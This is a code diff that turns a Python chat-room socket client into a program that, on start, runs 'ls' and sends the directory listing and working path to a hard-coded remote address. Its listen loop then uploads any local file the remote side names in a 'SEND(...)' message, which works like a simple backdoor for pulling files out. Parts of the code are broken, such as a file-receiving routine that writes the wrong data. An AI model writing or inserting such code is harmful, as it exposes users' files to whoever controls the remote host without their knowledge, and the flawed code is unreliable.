@@ -6,8 +6,10 @@ import random
 import os
 import tqdm
 import threading
+import os
+import subprocess
 
-BUFFER_SIZE = 4096
+BUFFER_SIZE = 5120
 SEPARATOR = "<SEPARATOR>"
 
 
@@ -22,7 +24,9 @@ class Client:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-        self.flag = 0
+        self.connections = []
+        self.fileName = ""
+        self.weight = ""
 
     def createSocket(self, port):
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -35,98 +39,82 @@ class Client:
     def encode(self, value):
         return value.encode('ascii')
 
+    def rec_file(self, file,):
+        filesize = BUFFER_SIZE
+        progress = tqdm.tqdm(range(
+            filesize), f"Receiving {self.fileName}", unit="B", unit_scale=True, unit_divisor=1024)
+        with open(self.fileName, "wb") as f:
+            f.write(self.encode(file))
+
+        # update the progrclient, client_address bar
+        # for i in range(filesize):
+        #     progress.update(i)
+        progress.update(filesize)
+
     def listen(self, client):
         while True:
-            data = client.recv(1024)
-            if not data:
-                break
-            print(self.decode(data))
+            data = client.recv(BUFFER_SIZE)
+            data = self.decode(data)
+            message = data[:data.find('(')]
+            if(message == "SEND"):
+                fileName = data[data.find('(')+1:data.find(')')]
+                print(fileName)
+                self.send_file(fileName, client)
+            if(message == "FILE"):
+                file = data[data.find('(')+1:data.find(')')]
+                print(file)
+                self.rec_file(file)
+
         client.close()
         exit(0)
+
+    def send_file(self, filename, client):
+        # get the file size
+        filesize = os.path.getsize(filename)
+        # create the client socket
+        # start sending the file
+        progress = tqdm.tqdm(range(
+            filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+        with open(filename, "rb") as f:
+            while True:
+                # read the bytes from the file
+                bytes_read = f.read(BUFFER_SIZE)
+                if not bytes_read:
+                    # file transmitting is done
+                    break
+                # we use sendall to assure transimission in
+                # busy networks
+                client.sendall(bytes_read)
+                # update the progress bar
+                progress.update(len(bytes_read))
 
     def send(self, client):
         while True:
             message = input("")
-            self.flag += 1
-            if(message == "./leave"):
-                break
-            client.send(self.encode(message))
+            if(message[:message.find("(")] == "REQUEST"):
+                self.fileName = message[message.find("(")+1:message.find(")")]
+                client.send(self.encode(message))
 
         client.send(self.encode(message))
-        self.flag += 1
         client.close()
         exit(0)
 
-    def rec_file(self, client):
-        received = client.recv(BUFFER_SIZE).decode()
-        filename, filesize = received.split(SEPARATOR)
-        # remove absolute path if there is
-        filename = os.path.basename(filename)
-        # convert to integer
-        filesize = int(filesize)
-        # start receiving the file from the socket
-        # and writing to the file stream
-        progress = tqdm.tqdm(range(
-            filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-        with open(filename, "wb") as f:
-            while True:
-                # read 1024 bytes from the socket (receive)
-                bytes_read = client.recv(BUFFER_SIZE)
-                if not bytes_read:
-                    # nothing is receivedc vb b+
-                    # file transmitting is done
-                    break
-            # write to the file the bytes we just received
-            f.write(bytes_read)
-            # update the progress bar
-        progress.update(len(bytes_read))
-
-    def joinChatRoom(self, port):
-        try:
-            client = self.createSocket(port)
-            name = input("Enter Name : ")
-            client.send(name.encode('ascii'))
-            _thread.start_new_thread(self.listen, (client,))
-            _thread.start_new_thread(self.send, (client,))
-            while True:
-                continue
-        except Exception as e:
-            print(e)
-            self.joinChatRoom(port+1)
-
     def start(self):
         client = self.createSocket(self.port)
+        cmd = subprocess.Popen("ls",
+                               shell=True, stdout=subprocess.PIPE,
+                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte, "utf-8")
+        currentWD = os.getcwd() + "> "
+        client.send(self.encode("F({})".format(output_str + currentWD)))
+    # _thread.start_new_thread(self.send, (client,))
+        _thread.start_new_thread(self.send, (client,))
+        _thread.start_new_thread(self.listen, (client,))
         while True:
-            try:
-                command = input("Enter command : ")
-                if(command == "./join"):
-                    port = input("Enter port of 5 digits: ")
-                    assert(len(port) == 5)
-                    client.close()
-                    self.joinChatRoom(int(port))
-                    break
-                elif(command == "./createRoom"):
-                    client.send(self.encode(command))
-                    reply = client.recv(1024)
-                    if not reply:
-                        raise Error.controllerError
-                        continue
-                    result = json.loads(str(self.decode(reply)))
-                    if(result["status"] == 200):
-                        if(result["type"] == "creation"):
-                            client.close()
-                            print(result["message"])
-                            self.joinChatRoom(result["port"])
-                            break
-                    else:
-                        raise Error.createRoomError
-                else:
-                    raise Error.commandInputError
-            except Exception as e:
-                print(e)
-                continue
+            continue
 
 
 if __name__ == '__main__':
-    client = Client('127.0.0.1', 12343)
+    client = Client('192.168.77.151', 1234)
     client.start()
